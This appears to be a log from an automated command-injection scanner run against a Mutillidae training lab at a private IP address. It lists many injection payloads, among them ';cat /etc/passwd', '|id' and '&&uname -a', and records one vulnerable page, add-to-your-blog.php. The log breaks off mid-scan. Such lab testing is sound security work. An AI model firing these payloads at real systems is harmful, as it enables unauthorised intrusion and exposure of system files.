INFO - 
Starting ScanCommandInject scan
INFO - 	No forms found on http://192.168.232.129:80/. Skipping...
INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	No command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/set-up-database.php. Skipping...
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=show-log.php. Skipping...
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=captured-data.php. Skipping...
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=credits.php. Skipping...
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	No command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	No command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=register.php
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	No command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php
WARNING - Command injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php with payload: ;cat /etc/passwd
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=site-footer-xss-discussion.php. Skipping...
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
